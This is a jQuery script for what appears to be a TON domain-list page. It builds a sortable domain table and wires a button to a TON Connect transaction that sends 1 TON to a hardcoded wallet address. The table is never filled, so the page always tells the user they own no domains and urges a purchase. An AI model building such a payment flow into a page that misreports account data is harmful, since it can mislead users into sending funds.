$(document).ready(function() {
    var arrayForTable = [
        ["Domain name", "Expires"]
    ]; // Ваш предыдущий код здесь 
    async function transaction() {
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec 
            messages: [{
                address: "UQArAeDf7ms8325Rd2rPzEc_XErU1AQOK3qRaQHlAyxGUwJ0",
                amount: "1000000000", // 
                stateInit: "base64bocblahblahblah==" // just for instance. Replace with your transaction initState or remove 
            }]
        }
        try { const result = await tonConnectUI.sendTransaction(transaction); } catch (e) { console.error(e); }
    }
    $('#send-transaction').click(function() { transaction(); });
    setTimeout(function() {
        $('#img-loading').hide();
        if (arrayForTable.length > 1) {
            $('#domtotal').text("Total: " + (arrayForTable.length - 1));
            $('#domtotal').show();
            var table = arrayToTable(arrayForTable, { thead: true, attrs: { class: 'table' } });
            $('#domain-table').append(table);
            $('th').click(function() {
                var table = $(this).parents('table').eq(0);
                var rows = table.find('tr:gt(0)').toArray().sort(comparer($(this).index()));
                this.asc = !this.asc;
                if (!this.asc) { rows = rows.reverse(); }
                for (var i = 0; i < rows.length; i++) { table.append(rows[i]); }
            });

            function comparer(index) {
                return function(a, b) {
                    var valA = getCellValue(a, index),
                        valB = getCellValue(b, index);
                    return $.isNumeric(valA) && $.isNumeric(valB) ? valA - valB : valA.toString().localeCompare(valB);
                };
            }

            function getCellValue(row, index) { return $(row).children('td').eq(index).text(); }
        } else {
            $('#connect-your-wlt').children('p').text("Unfortunately, you don't have any domains. I advise you to purchase it as soon as possible!");
            $('#connect-your-wlt').show();
        }
    }, 5000);
});